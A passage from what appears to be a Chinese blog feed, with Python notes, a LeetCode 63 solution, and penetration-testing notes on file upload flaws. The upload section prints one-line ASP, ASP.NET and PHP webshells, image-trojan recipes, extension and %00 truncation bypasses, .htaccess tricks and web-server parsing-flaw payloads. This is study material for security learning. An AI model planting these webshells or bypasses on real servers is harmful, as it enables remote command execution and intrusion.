不支持</strong>）。</td></tr><tr><td>r</td><td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td>rb</td><td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td>r+</td><td>打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td>rb+</td><td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td>w</td><td>打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td>wb</td><td>以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td>w+</td><td>打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td>wb+</td><td>以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td>a</td><td>打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td>ab</td><td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td>a+</td><td>打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td>ab+</td><td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.exists(&#x27;&#x27;) -&gt; True/False    #判断文件是否存在</span><br></pre></td></tr></table></figure><h3 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys    <span class="comment">#使用命令行传入的参数，需要导入sys模块,sys.argv</span></span><br><span class="line">def 函数名（参数列表 = 默认值）:    #默认值如有需要；可变类型的实参会被函数内部对形参的改变而改变，不可变类型的实参在函数内部被改变时，实际上是在一块新内存中创建了对象，不会影响实参；</span><br><span class="line">    函数体</span><br><span class="line">    <span class="keyword">return</span> 结果值    <span class="comment">#如有需要</span></span><br><span class="line"></span><br><span class="line">函数名 = <span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression    <span class="comment">#lambda匿名函数</span></span><br></pre></td></tr></table></figure><h3 id="七、模块"><a href="#七、模块" class="headerlink" title="七、模块"></a>七、模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__name__属性：当前模块内执行时，__name__=<span class="string">&#x27;__main__&#x27;</span>,被其它模块导入加载时运行__name__=<span class="string">&#x27;该模块名&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/aj5kBn"><img src="https://s1.ax1x.com/2020/08/12/aj5kBn.jpg" alt="aj5kBn.jpg"></a></p><h3 id="八、keyword关键字"><a href="#八、keyword关键字" class="headerlink" title="八、keyword关键字"></a>八、keyword关键字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line">keyword.iskeyword(<span class="string">&#x27;&#x27;</span>)    <span class="comment">#查询某字符串是否是关键字</span></span><br><span class="line">keyword.kwlist    <span class="comment">#输出所有关键字</span></span><br></pre></td></tr></table></figure><h3 id="九、代码风格"><a href="#九、代码风格" class="headerlink" title="九、代码风格"></a>九、代码风格</h3><p><a href="https://imgchr.com/i/avkPFP"><img src="https://s1.ax1x.com/2020/08/12/avkPFP.png" alt="avkPFP.png"></a></p><h3 id="十、Python对象"><a href="#十、Python对象" class="headerlink" title="十、Python对象"></a>十、Python对象</h3><p>1、特性：</p><ul><li>身份：每一个对象都有一个唯一的身份标识自己，也就是通过内建函数id()来得到的内存地址。</li><li>类型：通过内建函数type()查看对象的类型</li><li>值：对象表示的数据项</li></ul><h3 id="十一、使用Python密码爆破Linux系统"><a href="#十一、使用Python密码爆破Linux系统" class="headerlink" title="十一、使用Python密码爆破Linux系统"></a>十一、使用Python密码爆破Linux系统</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;用户名&#125;：&#123;加密后的口令密码&#125;：&#123;口令最后修改时间距原点(<span class="number">1970</span><span class="number">-1</span><span class="number">-1</span>)的天数&#125;：&#123;口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：&#123;口令最大修改间隔&#125;：&#123;口令失效前的警告天数&#125;：&#123;账户不活动天数&#125;：&#123;账号失效天数&#125;：&#123;保留&#125;</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">而所谓的密码域密文也是由三部分组成的，即：$id$salt$encrypted。</span><br><span class="line">id为<span class="number">1</span>时，采用md5进行加密；</span><br><span class="line">id为<span class="number">5</span>时，采用SHA256进行加密；</span><br><span class="line">id为<span class="number">6</span>时，采用SHA512进行加密。</span><br><span class="line"><span class="comment">### crypt.crypt(明文密码,salt)    此salt是id+salt</span></span><br></pre></td></tr></table></figure><h3 id="十二、Python模块的使用"><a href="#十二、Python模块的使用" class="headerlink" title="十二、Python模块的使用"></a>十二、Python模块的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer <span class="comment">#默认8000端口开启简单的HTTP服务</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>63-不同路径</title>
      <link href="/2020/08/06/Leetcode/63%E3%80%81%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84/"/>
      <url>/2020/08/06/Leetcode/63%E3%80%81%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h2 id="63、不同路径"><a href="#63、不同路径" class="headerlink" title="63、不同路径"></a>63、不同路径</h2><p><a href="https://leetcode-cn.com/problems/unique-paths-ii/">https://leetcode-cn.com/problems/unique-paths-ii/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aRFWJe"><img src="https://s1.ax1x.com/2020/08/06/aRFWJe.png" alt="aRFWJe.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>一道动态规划题，要想知道走到终点（i，j）的路径Z（i，j）有多少条，我们只需要知道Z（i-1，j）和Z（i，j-1）的到达路径数，相加即可。</p><p>因为此题的特点，我们可以获得一波初始值，并且从起点开始递推计算到重点。因为<u>机器人只能向右或者向下走</u>，所以第0行，和第0列的路径数一定是固定的。比如说第0行，要想到达第0行的任一元素，就必须从该元素的左边走过去；第0列也同样，必须从该元素的上面下来。因此，我们便获得了第0行和第0列所有位置的路径数，然后循环遍历整个二位数组，判断当前坐标是否有障碍物，如果有则到达该路径数Z（X，X）为0，如果没有则Z（X，X）=Z（i-1，j）+Z（i，j-1），这样便得到了最终的路径数。</p><p><strong>坑点：</strong>此题在开始时初始化第0行和第0列元素时，一定要注意，比如从左向右遍历第0行时，如果一旦发现障碍物，那右边的元素一定都为0，因为必须从左经过，但左边已经被堵住了；第0列的初始化同理，这里我报错了好多次，因为脑子笨只能自己画图来找问题。没办法，终归是菜。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePathsWithObstacles</span>(<span class="params">self, obstacleGrid: List[List[int]]</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        m = len(obstacleGrid[<span class="number">0</span>])</span><br><span class="line">        n = len(obstacleGrid)</span><br><span class="line">        res = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(m)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[<span class="number">0</span>][i] == <span class="number">0</span>:</span><br><span class="line">                res[<span class="number">0</span>][i] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> obstacleGrid[i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                res[i][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, m):</span><br><span class="line">                <span class="keyword">if</span> obstacleGrid[i][j] == <span class="number">0</span>:</span><br><span class="line">                    res[i][j] = res[i<span class="number">-1</span>][j] + res[i][j<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> res[n<span class="number">-1</span>][m<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2020/08/06/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/06/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>服务器没有对上传文件进行足够的过滤与配置，使得Web用户可以上传任意文件、恶意脚本文件、exe程序等。</p><h3 id="二、大马与小马的概念"><a href="#二、大马与小马的概念" class="headerlink" title="二、大马与小马的概念"></a>二、大马与小马的概念</h3><p>1、大马：php、asp、aspx等脚本语言所写，代码量很大，可以做的事情非常多。</p><p>2、小马：一句话木马，通常配合中国菜刀或蚁剑来使用。中国菜刀在连接一句话木马时需要填写密码（实际上就是变量名，下面的例子就是cmd）。</p><blockquote><p>中国菜刀与一句话木马配合实现的三大功能：</p><p>1、文件管理；2、虚拟终端；3、数据库管理</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ASP:</span><br><span class="line">&lt;%eval request(&#39;cmd&#39;)%&gt;</span><br><span class="line">ASP.NET:</span><br><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">PHP:</span><br><span class="line">&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</span><br><span class="line">#GET不行</span><br></pre></td></tr></table></figure><h3 id="三、Web文件上传漏洞利用的条件"><a href="#三、Web文件上传漏洞利用的条件" class="headerlink" title="三、Web文件上传漏洞利用的条件"></a>三、Web文件上传漏洞利用的条件</h3><p>1、Web服务器要开启文件上传功能，并且上传接口对外开放。</p><p>2、Web用户对于目标目录具有可写权限，甚至执行权限。（一般情况下Web目录都有执行权限）</p><p>3、Web容器可以解析脚本， 具备解析脚本的环境，这样就可以解析执行我们上传的文件。</p><p>4、服务器配置不当，开启了PUT方法，可直接上传。</p><h3 id="四、文件上传漏洞的防御与利用"><a href="#四、文件上传漏洞的防御与利用" class="headerlink" title="四、文件上传漏洞的防御与利用"></a>四、文件上传漏洞的防御与利用</h3><h4 id="1、黑白名单策略-访问控制"><a href="#1、黑白名单策略-访问控制" class="headerlink" title="1、黑白名单策略(访问控制)"></a>1、黑白名单策略(访问控制)</h4><p>URLBlacklist、URLWhitelist，对用户允许和禁止访问的网页写入名单。</p><h4 id="2、PUT方法上传文件（配置问题的典型，却很少见）"><a href="#2、PUT方法上传文件（配置问题的典型，却很少见）" class="headerlink" title="2、PUT方法上传文件（配置问题的典型，却很少见）"></a>2、PUT方法上传文件（配置问题的典型，却很少见）</h4><p>属于HTTP请求方法之一，如果服务器允许，直接通过HTTP请求数据包即可上传文件。</p><p>1）测试服务器是否允许PUT请求方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过telnet测试服务器支持的HTTP请求方法：</span></span><br><span class="line">----</span><br><span class="line">OPTIONS / HTTP/1.1</span><br><span class="line">HOST:192.168.2.144</span><br><span class="line">----</span><br></pre></td></tr></table></figure><p>2）服务器PUT请求方法的相关配置</p><p>Apache开启PUT文件上传的方法,httpd.conf配置文件：（配置后虽然OPTION不显示，但可以文件上传)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入模块,开启下面两条配置</span></span><br><span class="line">LoadModule dav_module modules/mod_dav.so</span><br><span class="line">LoadModule dav_fs_module modules/mod_dav_fs.so</span><br><span class="line"><span class="comment">#开启模块</span></span><br><span class="line">DocumentRoot  <span class="string">&quot;E:\phpStudy\WWW&quot;</span></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">    DAV On    <span class="comment">#此处加一行开启</span></span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"><span class="comment">#开启文件锁</span></span><br><span class="line">DavLockDB C:\phpstudy\www\DavLock    <span class="comment">#把此行放在配置文件第一行</span></span><br><span class="line">并且在C:\phpstudy\www\目录下的创建文件DavLock</span><br></pre></td></tr></table></figure><p>3）PUT方式上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /info1.php HTTP/<span class="number">1.1</span></span><br><span class="line">HOST: <span class="number">192.168</span><span class="number">.43</span><span class="number">.196</span></span><br><span class="line">Content-Length: <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、前端JS的限制与绕过"><a href="#3、前端JS的限制与绕过" class="headerlink" title="3、前端JS的限制与绕过"></a>3、前端JS的限制与绕过</h4><p>1）删除JS；2）先通过JS，后BP修改数据包</p><h4 id="4、服务器端检测绕过"><a href="#4、服务器端检测绕过" class="headerlink" title="4、服务器端检测绕过"></a>4、服务器端检测绕过</h4><h5 id="1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型："><a href="#1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型：" class="headerlink" title="1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型："></a><u>1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型</u>：</h5><p>MIME（Multipurpose Internet Mail Extensions）是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其它应用程序专用的数据。常见的MIME类型如下。在HTTP协议中，使用Content-Type字段表示文件MIME的类型。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mime-Type：</span></span><br><span class="line">.JS:    application/x-javascript</span><br><span class="line">.HTML:    text/html</span><br><span class="line">.php:    text/php</span><br><span class="line">.jpg:    image/jpeg</span><br><span class="line">.png:    image/png</span><br><span class="line">.pdf:    application/pdf</span><br></pre></td></tr></table></figure><p>因此，可通过修改请求报文中的Content-Type类型绕过检测。</p><h5 id="2）服务器端检测文件内容："><a href="#2）服务器端检测文件内容：" class="headerlink" title="2）服务器端检测文件内容："></a><u>2）服务器端检测文件内容：</u></h5><p>PHP函数getimagesize()除了可以计算图片的大小，在计算之前还会对文件的类型是否是图片做判断，因此有些PHP后端常使用该函数进行文件检查。exif_imagetype()检查文件头几个字节来区分不同的图片格式。</p><p>对于检测内容的情况，可以制作图片木马，也就是图片格式的文件，里面输入了木马语句。</p><p><u>制作图片马的方法：</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法1、GIF图片的例子</span></span><br><span class="line">GIF89a    <span class="comment">#gif文件欺骗，可通过getimagesize/exif_imagetype</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();&gt;</span><br><span class="line"><span class="comment">#方法2、DOS命令，合并木马和图片</span></span><br><span class="line">copy 图片/b+木马.php/a 生成的图片名</span><br><span class="line"><span class="comment">#方法3、利用十六进制编辑器,写入后Notepad HEX转ASCII，然后写木马</span></span><br><span class="line">.gif:<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> F1 <span class="number">00</span> <span class="number">2</span>C <span class="number">01</span> F7 <span class="number">00</span> <span class="number">00</span> <span class="number">64</span> <span class="number">32</span> <span class="number">33</span></span><br><span class="line">.jpg:FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">2</span>C</span><br><span class="line">.png:<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D <span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span> / 文件头 <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A + 数据块 + 数据块 + 数据块……</span><br></pre></td></tr></table></figure><h5 id="3）服务器端检查文件后缀名"><a href="#3）服务器端检查文件后缀名" class="headerlink" title="3）服务器端检查文件后缀名"></a><u>3）服务器端检查文件后缀名</u></h5><p>服务器端在检测文件名时，一般会采用黑白名单策略，不允许上传php|asp|aspx|jsp…等可执行脚本文件；白名单只允许上传jpg|gif|png|doc|rar…等格式的文件。</p><p>① - 可以尝试不同的脚本别名，来尝试绕过黑名单限制。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.php .php2 .php3 .php5 .phtml  | .pht .phps .php3p .php4 </span><br><span class="line">.asp .aspx .ascx .ashx .asa .cer</span><br><span class="line">.jsp .jspx</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ cat /etc/mime.types | grep php</span><br><span class="line">  <span class="comment">#application/x-httpd-php          phtml pht php</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php-source           phps</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php3         php3</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php3-preprocessed        php3p</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php4         php4</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php5         php5</span></span><br></pre></td></tr></table></figure><p>② - 对于后缀的白名单策略，我们只能上传在白名单内的文件后缀名。</p><h4 id="5、文件上传漏洞——00截断"><a href="#5、文件上传漏洞——00截断" class="headerlink" title="5、文件上传漏洞——00截断"></a>5、文件上传漏洞——00截断</h4><blockquote><p><em>php版本</em> &lt; 5.3.4 此漏洞存在</p></blockquote><p><u>当上传文件的数据包暴露上传文件的路径时</u>，我们可以采用%00截断，将上传文件的路径文件夹名命名为一个php文件，之后采用在文件名后加一个%00截断后面的真实文件名字符串拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如：url中暴露了文件保存路径 &#x2F;Pass-11&#x2F;index.php?save_path&#x3D;..&#x2F;upload&#x2F;</span><br><span class="line">服务器后台会对上传的文件进行随机命名，最后进行路径拼接存储文件，..&#x2F;upload&#x2F; + 712371751824.gif</span><br><span class="line">为了使上传的图片文件可以作为php脚本执行，我们可以再文件保存路径处构造一个php文件名充当保存路径，然后加一个%00截断后面的真实文件名，此时，路径拼接就构造成了：..&#x2F;upload&#x2F;test.php%00&#x2F;712371751824.gif。由于PHP是由C语言开发的，字符串的结束标志和C语言一样都是ASCII码为0的空字符，因此字符串类型的文件存储路径遇到%00就会被截断，后面的路径字符串不会被处理，成功的将文件上传为了..&#x2F;upload&#x2F;test.php</span><br></pre></td></tr></table></figure><h4 id="6、配置文件上传漏洞——-htaccess文件攻击"><a href="#6、配置文件上传漏洞——-htaccess文件攻击" class="headerlink" title="6、配置文件上传漏洞——.htaccess文件攻击"></a>6、配置文件上传漏洞——.htaccess文件攻击</h4><p>①Apache配置文件设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;网页根目录&quot;&gt;下的 AllowOverride All</span><br><span class="line">LoadModule rewrite_module &#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure><p>②漏洞原理：.htaccess文件是Apache的分布式配置文件，它会重写文件所在路径以及该路径下的所有子文件夹的Apache全局配置。</p><p>③攻击案例：</p><p>​    将.png文件当作PHP文件解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>​    文件名中包含.php关键字的文件当作PHP文件解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script php</span><br></pre></td></tr></table></figure><p>​    规定匹配文件名的文件当作PHP文件解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;zjcfilename&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>④注意事项</p><p>​    Windows中创建.htaccess文件时，认为它是一个没有文件名的htaccess格式的文件，我们需要创建一个新文件，将其另存为*.*文件格式的文件，就不会报错。</p><h4 id="7、Web容器解析漏洞"><a href="#7、Web容器解析漏洞" class="headerlink" title="7、Web容器解析漏洞"></a>7、Web容器解析漏洞</h4><h5 id="①Apache解析漏洞（1-x-2-x漏洞）"><a href="#①Apache解析漏洞（1-x-2-x漏洞）" class="headerlink" title="①Apache解析漏洞（1.x 2.x漏洞）"></a>①Apache解析漏洞（1.x 2.x漏洞）</h5><p>其实这属于Apache早期版本的特性，Apache识别文件类型是从右向左，直到识别写在mime.types配置文件中一个它认识的文件名后缀进行解析。因此，有些黑名单通过这个漏洞就可以绕过，payload:<code>hack.php.xxx</code></p><h5 id="②IIS6-0解析漏洞"><a href="#②IIS6-0解析漏洞" class="headerlink" title="②IIS6.0解析漏洞"></a>②IIS6.0解析漏洞</h5><p>​    1 - payload：<code>hack.asp;test.jpg</code>；</p><p>​    2 - <code>hack.asp/test.jpg</code>(文件后缀名为asp下的所有文件当作asp执行，此漏洞需要结合上传文件夹来利用)</p><h5 id="③Nginx解析漏洞"><a href="#③Nginx解析漏洞" class="headerlink" title="③Nginx解析漏洞"></a>③Nginx解析漏洞</h5><p>（1）0.8.37以下的版本，可以上传一个不被过滤后缀名的木马，如：shell.jpg，可以通过请求shell.jpg.php来进行正常解析</p><p>（2）空字节漏洞：（0.5.<em>, 0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37）</p><p>​    <code>Payload：http://www.xx.com/hack.png%00.php</code>，当nginx发现访问文件后缀名为.php时，会交给php-cgi进行解析，php-cgi读该文件名字符串发现%00时会停止读取（C语言字符串结束空字符%00），因此会将hack.png作为php文件执行</p><p>（3）文件名逻辑漏洞/CVE-2013-4547(0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7)：<a href="https://blog.csdn.net/Blood_Pupil/article/details/88565176">https://blog.csdn.net/Blood_Pupil/article/details/88565176</a></p><p>​    <code>Payload：http://www.xx.com/hack.png%20%00.php</code>，此漏洞是空字节漏洞后发现的漏洞，修复空字节漏洞后只通过%00截断路径，nginx会返回错误页面，这是逻辑漏洞逻辑之一。另外，nginx发现%20也就是空格时，会进入一个switch语句中的default，继续解析剩下的url，这是逻辑漏洞逻辑之二。因此，当%20和%00挨在一起时就会产生正常解析的逻辑漏洞，将此.png文件作为php文件解析。</p><h5 id="④PHP-CGI解析漏洞"><a href="#④PHP-CGI解析漏洞" class="headerlink" title="④PHP CGI解析漏洞"></a>④PHP CGI解析漏洞</h5><blockquote><p>漏洞主要配置原因是php.ini中的：cgi.fix_pathinfo=1    =0时无此漏洞</p></blockquote><p>​    1 - IIS7.0 / 7.5 + PHP环境：<code>hack.png/.php</code>    #上传hack.png访问时url加上/X.php就会当作php脚本运行将png中的php代码解析</p><blockquote><ul><li>配置IIS支持PHP解析：IIS -&gt; 处理程序映射 -&gt; 添加模块映射 -&gt; 请求路径 *.php; 模块:FastCgiModule; 可执行文件：PHP路径下的php-cgi.exe; 名称随便例如Fast-CGI-PHP</li><li>把php配置文件联系到IIS中：FastCGI设置 -&gt; 编辑 -&gt; 监视对文件所做的更改 -&gt; 选择PHP配置文件php.ini</li><li>补丁方法：处理程序映射 -&gt; 编辑对应的php映射 -&gt; 请求限制 -&gt; 映射中勾选仅当请求映射至一下内容时…. -&gt; 确定</li></ul></blockquote><p>​    2 - Nginx解析漏洞</p><p>​    上传1.jpg，访问时url加上/X.php就会当作php脚本运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;1.jpg&#x2F;1.php</span><br></pre></td></tr></table></figure><h4 id="8、一些在线编辑器的文件上传漏洞"><a href="#8、一些在线编辑器的文件上传漏洞" class="headerlink" title="8、一些在线编辑器的文件上传漏洞"></a>8、一些在线编辑器的文件上传漏洞</h4><h5 